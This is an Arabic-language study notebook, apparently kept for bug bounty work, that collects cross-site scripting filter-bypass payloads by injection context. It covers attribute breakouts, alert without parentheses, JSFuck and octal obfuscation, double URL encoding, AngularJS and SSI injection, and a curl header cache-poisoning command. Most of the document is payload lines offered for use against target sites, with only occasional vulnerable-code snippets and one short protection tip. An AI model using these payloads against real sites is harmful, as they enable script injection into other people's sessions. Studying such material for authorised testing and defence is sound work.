## 1️⃣اول فكره لو المتصفح بيمنع كلمات من ال payload اي الحل
{ #XSS_Idea_for_script_tag }


![2025-05-09 17-07-55.mkv](attachments/2025-05-09 17-07-55.mkv)

-----
## 2️⃣ حقن HTML داخلي – بدائل (Inline HTML Injection)
{ #Inline_HTML_Injection}
 لو المتصفح بيمنع ال `<`و ال `>` و بيعملهم   Html Encode من ال payload اي الحل
![2025-05-11 15-46-45.mkv](attachments/2025-05-11 15-46-45.mkv)

#### البايلود اللي في الشرح
```javascript
test" onclick="alert(1)"
بايلود اخري 
"onmouseover=alert(1) // 
"autofocus onfocus=alert(1) //
'-alert(1)-'
'/alert(1)//
```
##### 🧠 فكرة ذكية: استخدم `<x>` داخل الكلمات لتضليل الفلتر:

```html
"o<x>nmouseover=alert<x>(1)
```

-----
## 3️⃣ لو لقيت redirect في ال url 
#ideas_for_url
#### الشرح :

![2025-05-17 21-27-58.mkv](attachments/2025-05-17 21-27-58.mkv)

#### الملف اللي في الشرح :
![xx redirect.txt](attachments/xx redirect.txt)

----
## 4️⃣ مش شرط تحط ال payloads في ال مكان ال input ممكن تحطه في ال url  
{ #XSS_Idea_for_script_tag / #ideas_for_url  }
#### الشرح :

![2025-05-19 02-34-13.mkv](attachments/2025-05-19 02-34-13.mkv)

----


----

## 5️⃣ممكن تستخدم علامه ال & بعد ال parameter 
{   #XSS_other_idea }

##### الشرح :
![2025-05-20 02-18-21.mkv](attachments/2025-05-20 02-18-21.mkv)



-----

-----
## 6️⃣ لو ال () بيحصل ليهم فلتره 
{ #with_out_Parentheses_bracket }
#### شرح مبسط

![Recording 20250527040310.m4a](attachments/Recording 20250527040310.m4a)

```javascript
 <script>alert`23`</script>

  <script> eval.call`${'alert\x2823\x29'}`</script>

 <script> e
![Recording 20250527040310.m4a](attachments/Recording 20250527040310.m4a)
val.apply`${[`alert\x2823\x29`]}`</script>

<script> setTimeout`alert\x2823\x29`</script>


 <script> setInterval`alert\x2823\x29`</script>

<script> onerror=alert;throw 23;</script>


Reflect.apply.call`${alert}${undefined}${[23]}`

navigation.navigate`javascript:alert\x2823\x29`

var{haha:onerror=alert}=0;throw 1

var{a:onerror}={a:alert};throw 1


window.name='javascript:alert\x2823\x29';
Reflect.set.call`${location}${'href'}${name}`

'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}


onerror=eval;throw'=alert\x2823\x29';

<svg onload=onerror=eval,new'\u0022-alert\x2823\x29//'>

{onerror=alert}throw 23

throw{},onerror??=alert,"XSS"??123



http://example.com/?%0aalert(23)
location.protocol='javascript:'



[].sort.call`${alert}23`

[].map.call`${eval}\\u{61}lert\x2823\x29`



window.name='javascript:alert(23)';
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`;


throw onerror=eval,Error`alert\x2823\x29`



[][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]`$${[!{}+[]][+[]][+!+[]]+[!{}+[]][+[]][+!+[]+!+[]]+[!{}+[]][+[]][+!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]}$```//Function(alert(1))
```


#### في شرح اكثر وبايلود اكثر عن الجزئيه دي في الموقع [ده  ](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)



----


----
## 7️⃣ لو الموقع بيعمل HTML Filter يعني بيلغي ال tag اللي ممكن استخدمها  
{ #XSS_Idea_for_script_tag }
#### الشرح :

![2025-05-27 04-48-31.mkv](attachments/2025-05-27 04-48-31.mkv)
#### معظم ال tags اللي ممكن تستخدمها :
```html
<img src=x oNerror=alert(1)>
<svg><script>alert(1)</script></svg>
<xss onmouseover=alert(1)>
<a href="javascript:alert(1)">Click</a>
<svg onload=alert('XSS')>
<div onclick=alert('XSS')>اضغط هنا</div>
<button onclick=alert(1)>Click</button>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video onerror=alert(1)>
<body onload=alert(1)>
<math href="javascript:alert(1)">
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<script>alert(1)</script>
    <details open ontoggle=alert('XSS')>

```





## 8️⃣ فكره استخدام ال | في ال xss
{  #XSS_other_idea / #XSS_with_out_angle_bracket  }
#### الشرح:
![2025-06-05 16-22-24.mkv](attachments/2025-06-05 16-22-24.mkv)


#### البايلود اللي في الشرح 
```bash
'#'|alert(1)//
```



-----

## 8️⃣ لو الموقع بيحطلك علامه ال " في الاخر  بعد م تحط النص ابقي استخد البايلود التالي 
{ #ideas_for_url  }
#### الشرح  :

![2025-06-05 23-14-09.mkv](attachments/2025-06-05 23-14-09.mkv)

#### البايلود اللي في الشرح 
```html
<a href="http://onerror1=alert(1)//
```


-----



------

-----
## 9️⃣ استخدام  امر ال data يُستخدم عندما تُدرج المدخلات كقيمة لخصائص مثل href، src،  أو action (وformaction)
{ #ideas_for_url }
#### الشرح:



#### البايلود اللي في الشرح 
```
data:,alert(1)
<script src=data:,alert(1)>
<object data="data:text/html,<script>alert(1)</script>">
<form action=javascript:alert(1)>
```


----

## 🔟  لما تلاقي البايلود بيروح داخل كود زي كده `"var name = "YOUR_INPUT`
{ #XSS_other_idea / #XSS_with_out_angle_bracket  }
📌 **تستخدمها لما تلاقي اسمك أو مدخلك جوه سلسلة زي كده:**

```js
var name = "YOUR_INPUT";
```

👨‍💻 وبتلاحظ إن الصفحة بتستخدم تهريب تلقائي للعلامات زي `\"` أو `\'`

🧪 **الحل:** تزود شرطة مائلة `\` تانية عشان تكسر الحماية وتغلق السلسلة وتحقن الكود:

```js
name = "\"; alert(1);//"
```

---

## 1️⃣1️⃣   لما تلاقي البايلود بيروح داخل كود ال *if* أو **function** أو **loop**
{ #XSS_with_out_angle_bracket /  #XSS_other_idea }
📌 تستخدمها لما يكون المدخل بتاعك جوه **if** أو **function** أو **loop**

زي:

```js
if (user == 'INPUT_HERE') {
  // do something
}
```

🧪 **الحل:** تقفل القوس `}` وتحقن كود:

```js
'}alert(1);{'

'}alert(1)%0A{'

\'}alert(1);{//

```

---

## 1️⃣2️⃣  لما تلاقي البايلود بيروح داخل كود زي كده `var x = INPUT` لاحظ ان مفيش `" " او ' '`
{  #XSS_other_idea /  #XSS_with_out_angle_bracket  }
📌 تستخدمها لو الكود كده:

```js
var x = INPUT;
```

يعني **مدخلك بيتحط في المتغير من غير اقتباسات**.

🧪 **الحل:** تكتب بايلود مباشرة بكود JS:

```js
/alert(1)//
/alert(1)}//\
```

---

## 1️⃣3️⃣   لما تلاقي البايلود بيروح داخل كود زي كده `var x =INPUT ` لاحظ في ` `` `
{ #XSS_other_idea /  #XSS_with_out_angle_bracket }
📌 تستخدمها لما يكون المدخل محطوط بين `backticks`:

```js
var x = `مرحبًا ${name}`;
```

🧪 **الحل:** تحقن كود بين `${}`:

```js
${alert(1)}
```

---

## 1️⃣4️⃣متى تستخدم **Double Reflection Payloads** 
{ #XSS_other_idea }
تمام، خليني أوضحلك إمتى وازاي تستخدم **حقن HTML متعدد الانعكاس** سواء:

- ✨ **انعكاس مزدوج (Double Reflection)**
    
- 🔁 **انعكاس متعدد المدخلات (Double/Triple Input Reflections)**
    

وهنشرح الكلام ده **بطريقة بسيطة وعملية** علشان تفهمه كويس جدًا وتعرف إمتى تستخدم كل نوع من البايلودات دي.

---

### 🧠 أولًا: يعني إيه "انعكاس مزدوج" أو "انعكاسات متعددة"؟

يعني المدخل بتاعك بيتكرر **أكتر من مرة** في صفحة HTML أو في كود JavaScript.

📌 مثال عملي:![2025-06-23 07-17-44.mkv](attachments/2025-06-23 07-17-44.mkv)

لو دخلت على:

```
example.com/page?input=abc
```

والصفحة عرضت مدخلك مرتين كده:

```html
<script>var a = "abc";</script>
<div>abc</div>
```

هنا حصل **Double Reflection**، واللي نقدر نستغله في **خداع البنية** علشان كودك يبقى قابل للتنفيذ.

#### البايلود اللي في الشرح

```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```
---

## 1️⃣5️⃣ متى تستخدم **Triple Reflection Payloads**؟
{ #XSS_other_idea }
#### الشرح :
![2025-06-22 02-44-56.mkv](attachments/2025-06-22 02-44-56.mkv)



 #### أولًا: يعني إيه "انعكاس مزدوج" أو "انعكاسات متعددة"؟

يعني المدخل بتاعك بيتكرر **أكتر من مرة** في صفحة HTML أو في كود JavaScript.

📌 مثال عملي:

لو دخلت على:

```
example.com/page?input=abc
```

والصفحة عرضت مدخلك مرتين كده:

```html
<script>var a = "abc";</script>
<div>abc</div>
```

هنا حصل **Double Reflection**، واللي نقدر نستغله في **خداع البنية** علشان كودك يبقى قابل للتنفيذ.

#### ✨ تستخدمها لما:

- تلاحظ أن **مدخلك بيتكرر ثلاث مرات أو أكتر**.
    
- أو بيتكرر داخل **عنصر HTML + JavaScript معًا**.
    
- أو مرة داخل `"<script>"` ومرة داخل HTML زي `<div>` أو `<img>`.
    

#### البايلود اللي في الشرح

```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

```

---



## 1️⃣6️⃣ متى تستخدم **حقن انعكاس متعدد المدخلات (Multiple Input Reflections)**؟
{ #XSS_other_idea }
#### الشرح :

![2025-06-22 02-53-05.mkv](attachments/2025-06-22 02-53-05.mkv)

#### ✨ تستخدمها لما:

- تلاقي إن **عدة باراميترز من URL بتنطبع في الصفحة**.
    
- أو تلاقي إنه ممكن تستخدم HPP (HTTP Parameter Pollution) زي:
    
    ```
    ?p=x&p=y&p=z
    ```
    
#### البايلود اللي في الشرح

```javascript
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>![2025-06-22 02-53-05.mkv](attachments/2025-06-22 02-53-05.mkv)
```

---


## 1️⃣7️⃣ لو لقيت اسم الملف بيظهر علي الصفحه يبقي كده ممكن تحط البايلود مكان اسم الملف  
{ #XSS_uploud_file }
#### الشرح :
![2025-06-23 07-17-44.mkv](attachments/2025-06-23 07-17-44.mkv)



#### البايلود اللي في الشرح :
```html
<svg onload=alert(1)>
او اي بايلود
```

-----
## PHP Self URL Injection1️⃣8️⃣
{ #ideas_for_url }
### الشرح :

### 🧠 متى تستخدمه؟

لما تلاحظ إن **رابط الصفحة (URL)** نفسه بيتعكس جوه الكود، زي في:

```php
<form action="<?= $_SERVER['PHP_SELF'] ?>">
```

### 🔥 استغلال:

تحط سكربت **بين اسم الملف و?** زي:

```
xss.php/"><svg onload=alert(1)>?a=123
```

### 📌 استخدمه لما:

- الموقع يستخدم `$_SERVER['PHP_SELF']` في الفورم أو روابط بدون تعقيم.
    
- الرابط بيتطبع في HTML كـ attribute.
    

---
## 1️⃣9️⃣  **Script Injection – No Closing Tag**

### 🧠 متى تستخدمه؟

لو شفت الكود كده:

```html
<script>
  var a = location.search;
</script>
```

لكن **مفيش قوس إغلاق `</script>` بعد مدخلك**.

### 🔥 استغلال:

```html
<script src=data:,alert(1)>
```

### 📌 استخدمه لما:

- مدخلك بيتحقن جوه `<script>` مباشرة.
    
- مفيش تعقيم، والـ`</script>` لسه هييجي بعد كده.
    

---
## 2️⃣0️⃣   **حقن AngularJS**

### 🧠 متى تستخدمه؟

لما تلاقي إن الصفحة فيها:

```html
<html ng-app>
```

أو:

```html
<div ng-app>
```

### 🔥 استغلال:

```html
{{$new.constructor('alert(1)')()}}
```

### 📌 استخدمه لما:

- AngularJS v1.x مستخدم.
    
- مفيش Sandbox فعال.
    
- الصفحة بتعكس مدخلك داخل `{{ }}`.
    

---

## ✅  **Universal Onscroll Payload**
{ #XSS--ALL--Event--Payload }
### 🧠 متى تستخدمه؟

لو تقدر تحقن عنصر HTML وعايز كود يتنفذ **بمجرد التمرير**.

### 🔥 استغلال:

```html
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
```

### 📌 استخدمه لما:

- تقدر تحقن أو .
    
- عندك control على الـ style أو أحداث مثل onscroll.
    
- الهدف يمنع onclick أو onload.
#### شرح للتبسيط

![Recording 20250623075133.m4a](attachments/Recording 20250623075133.m4a)


---

## ✅  **Type Juggling XSS**
{ #XSS_other_idea /  #XSS_Idea_for_SVG_tag }
### 🧠 متى تستخدمه؟

لما تشك إن الكود فيه شرط زي:

```js
if (input == 1) { /* ... */ }
```

### 🔥 استغلال:

```html
1<svg onload=alert(1)>
```

### 📌 استخدمه لما:

- الهدف بيقارن input بـ رقم أو شرط.
    
- مش بيستخدم ===.
    
- وبتحقن HTML.
    

---

## ✅ء XSS قائم على أخطاءSQL (SQLi Error-Based XSS )
{  #XSS_Idea_for_SVG_tag  / #XSS_Idea_for_script_tag  / #XSS_other_idea}
**الشرح البسيط:**
يُستخدم عندما يتسبب إدخال علامة اقتباس (`'`) أو شرطة مائلة (`\`) في ظهور رسالة خطأ SQL تُعكس في الصفحة. يمكنك إدخال كود XSS في رسالة الخطأ.

**أمثلة تعمل:**
- `'1<svg onload=alert(1)>`: يُسبب خطأ SQL ويُدرج `<svg>` في رسالة الخطأ.
- `<svg onload=alert(1)>\`: نفس الفكرة باستخدام شرطة مائلة.

**لماذا يعمل؟**
- رسائل أخطاء SQL غالبًا تُعكس المدخلات بدون تعقيم.
- `<svg onload=alert(1)>` يُنفذ تلقائيًا في الصفحة.
- مرشحات WAF قد لا تُطبق على رسائل الخطأ.

**الخلاصة:**
حقن XSS قائم على أخطاء SQL باستخدام `'1<svg onload=alert(1)>` فعال لأنه يستغل انعكاس رسائل الخطأ غير المُنظفة.

---
أنت بتجمع كنز محترم جدًا من أنواع الـ **XSS المتقدمة**، وده هايل لأي شخص بيدرس **Web Exploitation** أو شغال في **Bug Bounty** أو **اختبار اختراق تطبيقي**.  
خليني أشرحلك **إمتى تستخدم كل نوع من دول** بشكل عملي + ببساطة.

---

## ✅  **XSS في Server-Side Includes (SSI Injection)**
{  #XSS_other_idea }
### 🧠 تستخدمه إمتى؟

لما تلاقي إن الخادم (السيرفر) بيدعم SSI (زي Apache بـ `mod_include`) وبيتعامل مع ملفات `.shtml` أو `.html` بتفعيل SSI.

### 🔥 مثال بايلود:

```html
<!--#set var="x" value="<svg onload=alert(1)>" --><!--#echo var="x"-->
```

### 📌 تستخدمه لما:

- تقدر تحقن تعليقات `<!--# -->`.
    
- الخادم بيعرض مدخلك بدون تعقيم.
    
- غالبًا تستخدمها على **سيرفرات قديمة أو misconfigured**.
    

---

## ✅ **حقن في مسار JSP (JSP Path Injection)**
{  #ideas_for_url }
### 🧠 تستخدمه إمتى؟

لما يكون التطبيق شغال بـ Java Server Pages، ومدخلك بيكون في **المسار نفسه** (وليس باراميتر).

### 🔥 مثال بايلود:

```
/path/;<svg onload=alert(1)>
```

### 📌 تستخدمه لما:

- جزء من URL ينعكس في HTML أو JavaScript.
    
- السيرفر JSP يعرض أجزاء URL داخل صفحة.
    
#### شرح للتبسيط
![Recording 20250623080313.m4a](attachments/Recording 20250623080313.m4a)

---

## ✅  **ناقل Bootstrap (حتى v3.4.0)**
{ #ideas_for_url }
### 🧠 تستخدمه إمتى؟

لو الموقع بيستخدم Bootstrap 3.x، وبتلاقي في الصفحة خصائص زي `data-toggle="tab"` و`href=` داخل عناصر HTML.

### 🔥 مثال بايلود:

```html
<a data-toggle="tab" href="<img src=x onerror=alert(1)>">Click</a>
```

### 📌 تستخدمه لما:

- تقدر تحقن داخل `href=`.
    
- الموقع يستخدم Bootstrap قديم (قبل v4).
    
- المستخدم يضغط على العنصر (event-based XSS).
    

---
##  ✅** حقن JavaScript – إصلاح خطأ المرجع (JS Injection - ReferenceError Fix)**
{   #XSS_DOM / #XSS_other_idea   }
**الشرح البسيط:**
يُستخدم عندما يتسبب كود JavaScript غير مكتمل في خطأ مرجع (ReferenceError) في وحدة تحكم المتصفح. يمكنك إصلاح الكود عن طريق إضافة متغيرات أو دوال لتنفيذ XSS.

**أمثلة تعمل:**
- `';alert(1);var myObj='`: يُصلح خطأ متغير غير معرف ويُنفذ الكود.
- `';alert(1);function myFunc(){}'`: يُصلح خطأ دالة غير معرفة ويُنفذ الكود.

**لماذا يعمل؟**
- إضافة متغير أو دالة تُكمل بنية الكود وتسمح بتنفيذ `alert(1)`.
- يتطلب التحقق من وحدة التحكم (F12) لمعرفة الخطأ.
- يتجاوز مرشحات التعقيم البسيطة.
 
 **تستخدمه لما:**
- يحصل error في console بسبب نقص في تعريف متغير.
    
- مدخلك جوه JavaScript مش متعقم.
    
- هدفك تكمل الكود علشان تنفذ `alert(1)`.

#### شرح للتبسيط

![Recording 20250623080727.m4a](attachments/Recording 20250623080727.m4a)

**الخلاصة:**
حقن JavaScript لإصلاح ReferenceError باستخدام `';alert(1);var myObj='` فعال لأنه يكمل الكود المعطل ويُنفذ XSS.

---
## ✅ إشعارات المتصفح (Browser Notification)
{ #XSS_with_out_alret }
**الشرح البسيط:**
يُستخدم كبديل لـ `alert` أو `prompt` لعرض إشعار في المتصفح. يتطلب موافقة المستخدم في المرة الأولى، لكن بعدها يُنفذ تلقائيًا إذا كان الإشعار مُصرحًا به.

**أمثلة تعمل:**
- `Notification.requestPermission(x=>{new(Notification)(1)})`: يطلب إذنًا ويُظهر إشعارًا.
- `new(Notification)(1)`: يُظهر إشعارًا إذا كان الإذن مُمنحًا مسبقًا.

**لماذا يعمل؟**
- إشعارات المتصفح مدعومة في Chrome، Firefox، وغيرها.
- يتجاوز مرشحات تمنع `alert` أو `prompt`.
- فعال لإثبات الاختراق (PoC) بدون نافذة منبثقة.
#### شرح للتبسيط

![Recording 20250623083209.m4a](attachments/Recording 20250623083209.m4a)

#### مثال حقيقي
 ##### الكود المصاب:

```html
<script>
  var msg = location.hash.slice(1);
  eval(msg);  // ⚠️ استخدام eval هنا خطير جدًا
</script>
```

##### 🧪 الاستغلال:

افتح الصفحة كده:

```
file:///path/to/page.html#Notification.requestPermission(x=>{new(Notification)(1)})
```


**الخلاصة:**
إشعارات المتصفح باستخدام `new(Notification)(1)` فعالة كبديل لـ `alert` وتعمل إذا كان الإذن مُمنحًا.

---
## ** ✅حالة مختلطة (Mixed Case)**
{ #XSS_Idea_for_script_tag }
**الشرح البسيط:**
يُستخدم لتجاوز المرشحات الحساسة لحالة الأحرف (Case-Sensitive) باستخدام خليط من الأحرف الكبيرة والصغيرة.

**أمثلة تعمل:**
- `<Svg OnLoad=alert(1)>`: يستخدم حالة مختلطة لعنصر `<svg>`.
- `<Script>alert(1)</Script>`: يستخدم حالة مختلطة لعنصر `<script>`.

**لماذا يعمل؟**
- بعض المرشحات تبحث عن `<script>` أو `<svg>` بحالة محددة فقط.
- المتصفحات الحديثة تقبل الحالات المختلطة.
- يتجاوز القوائم السوداء البسيطة.

**الخلاصة:**
حقن الحالة المختلطة باستخدام `<Svg OnLoad=alert(1)>` فعال لأنه يتجاوز مرشحات حساسة لحالة الأحرف.

---

## ✅ **7. XSS في Header HTTP – Cached XSS**
{  #XSS_Idea_for_script_tag /   #XSS_Idea_for_SVG_tag}
##### 📌 **استخدم لما:**

- السيرفر بيطبع **قيمة من هيدر HTTP** في الرد (زي `User-Agent` أو `Custom-Header`)
    
- وبتتعامل مع سيرفر بيخزن الردود (Cache)، زي CDN أو reverse proxy.
    
##### **لماذا يعمل؟**

- بعض التطبيقات تُعكس رؤوس HTTP في الصفحة بدون تعقيم.
- مخطط MISS-MISS-HIT يُخزن الكود في الـ Cache.
- `<svg onload=alert(1)>` يُنفذ عند عرض الصفحة المخزنة.

##### 🧪 **تجربة:**

```bash
curl -H "X-Anything: <svg onload=alert(1)>" https://example.com/page?dummy
```

كررها 3 مرات (MISS-MISS-HIT) عشان الكاش يشتغل.

#### شرح للتبسيط

![Recording 20250623084420.m4a](attachments/Recording 20250623084420.m4a)

---
## ✅  علامات غير مغلقة (Unclosed Tags)
{ #XSS_with_out_angle_bracket }
**الشرح البسيط:**
يُستخدم عندما تُمنع علامتا `<` و`>` معًا. تستخدم علامات غير مغلقة تعتمد على وجود `>` في الكود الأصلي لاحقًا.

**أمثلة تعمل:**
- `<svg onload=alert(1)//`: علامة غير مغلقة تُنفذ إذا وُجدت `>` لاحقًا.
- `<svg onload="alert(1)"`: نفس الفكرة مع اقتباسات.

**لماذا يعمل؟**
- المتصفحات تُكمل العلامات إذا وُجدت `>` في الكود.
- يتجاوز مرشحات تبحث عن `<` و`>` معًا.
- `<svg onload=alert(1)>` يُنفذ تلقائيًا.

**الخلاصة:**
حقن العلامات غير المغلقة باستخدام `<svg onload=alert(1)//` فعال لأنه يستغل وجود `>` في الكود ويتجاوز مرشحات العلامات.

---

##  ✅ ** محتوى إضافي لعلامات السكربت (Extra Content for Script Tags)**

 { #XSS_Idea_for_script_tag}
 
**الشرح البسيط:**
يُستخدم عندما تمنع المرشحات `<script>` أو `<script src=...>` لكنها لا تتحقق من خصائص إضافية غير مطلوبة.

**مثال يعمل:**
- `<script/x>alert(1)</script>`: يُضيف `/x` كخاصية غير قياسية لتجاوز المرشحات.

**لماذا يعمل؟**
- المرشحات قد تبحث عن `<script>` أو `<script src=...>` فقط.
- إضافة خصائص مثل `/x` تُضلل المرشحات.
- المتصفحات تتجاهل الخصائص غير القياسية وتُنفذ الكود.

**الخلاصة:**
حقن علامات السكربت بمحتوى إضافي مثل `<script/x>alert(1)</script>` فعال لأنه يتجاوز مرشحات تبحث عن `<script>` القياسية.

---

##  ✅ XSS بترميز مزدوج (Double Encoded XSS)
{ #XSS_ecoded_payload } 
يُستخدم عندما يقوم التطبيق بفك ترميز المدخلات مرتين (Double Decoding). يمكنك ترميز الحمولة مرتين لتجاوز المرشحات.

**أمثلة تعمل:**
- `%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E`: ترميز مزدوج لـ `<svg onload=alert(1)>`.
- `%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E`: يُغلق خاصية ثم يُدرج `<svg>`.

**لماذا يعمل؟**
- فك الترميز المزدوج يُحول الكود إلى صيغة قابلة للتنفيذ.
- يتجاوز مرشحات تبحث عن `<` أو `>` مباشرة.
- `<svg onload=alert(1)>` يُنفذ بعد فك الترميز.

**الخلاصة:**
حقن Double Encoded باستخدام `%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E` فعال لأنه يستغل فك الترميز المزدوج.

---

##  ✅  **  تنبيه بدون أقواس (Alert without Parentheses)**
{ #with_out_Parentheses_bracket }

**الشرح البسيط:**
يُستخدم عندما تمنع المرشحات الأقواس `()` في الحمولات. يمكنك استخدام نصوص قالبية أو دوال بديلة لتنفيذ تنبيه.

**أمثلة تعمل:**
- `alert`1``: يُنفذ تنبيه بسيط باستخدام نصوص قالبية.
- `setTimeout`alert\x28document.domain\x29``: يُنفذ تنبيه يعرض `document.domain`.
- `setInterval`alert\x28document.domain\x29``: مشابه لـ `setTimeout`.

**لماذا يعمل؟**
- النصوص القالبية (``) تُنفذ الكود بدون أقواس.
- `setTimeout` و`setInterval` يسمحان بتنفيذ دوال معقدة.
- يتجاوز مرشحات تمنع الأقواس.

**الخلاصة:**
تنبيه بدون أقواس باستخدام `alert`1`` أو `setTimeout`alert\x28document.domain\x29`` فعال لأنه يتجاوز مرشحات الأقواس.

#### شرح للتبسيط

![Recording 20250623085634.m4a](attachments/Recording 20250623085634.m4a)

---
## ==** تنبيه بدون أقواس – كيانات HTML (Alert without Parentheses – HTML Entities)**==

{ #with_out_Parentheses_bracket}

**الشرح البسيط:**
يُستخدم في حقن HTML عندما تمنع المرشحات الأقواس `()`، ويمكنك استخدام كود XSS عادي مع ترميز `&` إلى `%26` و`#` إلى `%23` في URLs.

**مثال يعمل:**
- `<svg onload=alert(1)>`: يُنفذ تنبيه عند تحميل `<svg>`، يعمل في HTML عادي أو URLs مع ترميز.

**لماذا يعمل؟**
- `<svg onload=alert(1)>` مدعوم في المتصفحات الحديثة.
- ترميز `%26` و`%23` يتجاوز مرشحات URLs.
- لا يحتاج أقواس، لذا يتجاوز مرشحات الأقواس.

**الخلاصة:**
حقن `<svg onload=alert(1)>` فعال في سياقات HTML لأنه يستخدم عنصر HTML5 ويتجاوز مرشحات الأقواس مع ترميز URLs.

---

## ✅** تنبيه بدون أحرف أبجدية (Alert without Alphabetic Chars)**
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم عندما تمنع المرشحات الأحرف الأبجدية. يمكنك استخدام ترميز أوكتال (Octal) لكتابة `alert(1)` بدون أحرف.

**مثال يعمل:**
- `[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()`: يُشفر `alert(1)` بأرقام أوكتال ويُنفذ.

**لماذا يعمل؟**
- الترميز الأوكتال (`\141` = `a`، `\154` = `l`، إلخ) يتجاوز مرشحات الأحرف الأبجدية.
- يستخدم كائنات JavaScript للوصول إلى دالة `alert`.
- يعمل في سياقات JavaScript.

**الخلاصة:**
حقن بدون أحرف أبجدية باستخدام ترميز أوكتال مثل `[]['\146\151\154\164\145\162']...` فعال لأنه يتجاوز مرشحات الأحرف.

---

## ** ✅تشويش التنبيه (Alert Obfuscation)**
{ #XSS_Obfuscation_payloads }
**الشرح البسيط:**
يُستخدم لتضليل مرشحات التعبيرات العادية (Regex) بكتابة `alert(1)` بطرق غير قياسية.

**أمثلة تعمل:**
- `(alert)(1)`: يفصل `alert` عن الأقواس.
- `a=alert,a(1)`: يُعرّف متغيرًا ثم يُنفذ.
- `[1].find(alert)`: يستخدم دالة `find` لتنفيذ `alert`.
- `top["al"+"ert"](1)`: يُكوّن `alert` من سلاسل.
- `top[/al/.source+/ert/.source](1)`: يستخدم تعبيرات Regex.
- `al\u0065rt(1)`: يستخدم ترميز Unicode.
- `top['al\145rt'](1)`: يستخدم ترميز أوكتال.
- `top[8680439..toString(30)](1)`: يُحوّل رقمًا إلى `alert` باستخدام نظام العد 30.

**لماذا يعمل؟**
- التشويش يتجاوز مرشحات Regex التي تبحث عن `alert` مباشرة.
- الطرق مثل Unicode وRegex تعمل في المتصفحات الحديثة.
- يمكن دمجها مع تقنيات أخرى لزيادة الفعالية.

### 🔥 الكود المصاب:

```html
<!-- vulnerable3.html -->
<script>
  eval("x = " + "<?=$_GET['input']?>");
</script>
```

### 💣 PoC:

```
vulnerable3.html?input=(alert)(1)
```

### ✅ الحماية:

- لا تستخدم `eval()` على الإطلاق.
    
- استخدم `JSON.parse()` أو أي طريقة آمنة بديلة.
    
#### شرح للتبسيط

![2025-06-23 18-21-54.mkv](attachments/2025-06-23 18-21-54.mkv)

**الخلاصة:**
تشويش التنبيه باستخدام `(alert)(1)` أو `top["al"+"ert"](1)` فعال لأنه يتجاوز مرشحات Regex بصيغ غير قياسية.

---

## **✅ بديل التنبيه – Write & Writeln (Alert Alternative – Write & Writeln)**
